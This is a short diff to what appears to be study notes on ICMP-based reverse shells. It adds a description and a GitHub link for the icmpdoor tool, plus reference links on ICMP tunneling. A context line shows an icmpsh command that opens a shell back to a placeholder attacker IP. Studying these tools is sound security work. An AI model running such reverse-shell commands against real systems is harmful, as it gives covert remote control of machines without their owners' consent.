@@ -143,6 +143,10 @@ icmpsh.exe -t <attacker_ip>
 - only targets windows computers
 
 ### icmpdoor
+icmpdoor is another more modern icmp based reverse-shell program.
+
+[icmpdoor](https://github.com/krabelize/icmpdoor) is vavailable on GitHub under the BSD 3-Clause License.
+
 improvements over icmpsh:
 - the attacker can use Windows or GNU/Linux
 - the victim can be a Windows or a GNU/Linux mashine
@@ -186,3 +190,8 @@ https://ieeexplore.ieee.org/document/5590253
 
 https://stackoverflow.com/questions/3655306/ubuntu-usr-bin-env-python-no-such-file-or-directory
 
+https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/
+
+https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/
+
+https://cryptsus.com/blog/icmp-reverse-shell.html
